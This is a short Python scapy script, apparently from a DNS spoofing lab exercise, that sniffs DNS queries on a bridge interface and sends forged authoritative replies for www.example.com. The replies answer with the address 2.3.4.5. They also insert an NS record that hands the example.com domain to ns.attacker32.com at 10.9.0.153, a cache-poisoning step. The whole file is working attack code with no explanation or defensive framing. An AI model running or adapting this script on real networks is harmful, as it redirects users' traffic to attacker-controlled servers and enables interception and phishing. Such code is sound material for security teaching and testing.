#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}")) 
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='2.3.4.5')
        NSsec1 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata='ns.attacker32.com')
        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',ttl=259200, rdata='10.9.0.153')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1,
             ancount=1,nscount=1,arcount=1,an=Anssec, ns=NSsec1, ar=Addsec1)

        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        
MyFilter = "udp and dst port 53"
pkt = sniff(iface='br-9a4a5074c42d',filter=MyFilter, prn=spoof_dns)